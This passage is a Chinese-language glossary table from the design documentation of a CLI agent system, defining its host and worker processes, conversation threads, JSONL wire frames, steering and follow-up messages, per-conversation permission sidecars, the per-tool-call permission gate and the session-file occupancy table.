| ------------- | ---------------------------------------------------------------------- |
| host          | pai-cli 主进程：路由、凭据、进程管理、唯一对外通道                     |
| worker        | 每个活跃对话一个的子进程，内含一个 pi 会话                             |
| 孙进程        | worker 为子 agent 任务临时 spawn 的进程，跑完即焚，深度只有 1          |
| thread / 线程 | 一个对话；threadId 恒等于其会话文件的 id                               |
| entry         | 会话文件里的一条追加记录，id 持久，可作增量游标                        |
| 帧-frame      | host 向客户端输出的一行 JSON（response / event / heartbeat 等 8 类）   |
| JSONL         | 每行一个 JSON 对象的文本格式，本项目全部线协议的载体                   |
| steer         | 模型流式中插入的转向消息（当前工具调用后生效）                         |
| follow_up     | 排到本轮结束后投递的追问                                               |
| parked/dead   | 闲置收编后的对话状态 / worker 异常死亡后的对话状态，下条命令都自动恢复 |
| sidecar       | 按对话独立的权限规则文件，优先于全局规则，fork 时随行复制              |
| 权限门        | 每次工具调用前的规则裁决（放行/拦截/弹窗问用户）                       |
| settle        | 一轮 agent 执行的彻底结束（`agent_settled` 事件），或一个弹窗得到答复  |
| 占用表        | host 维护的会话文件单写者保护：spawn 即占位，占用中拒绝再次打开        |
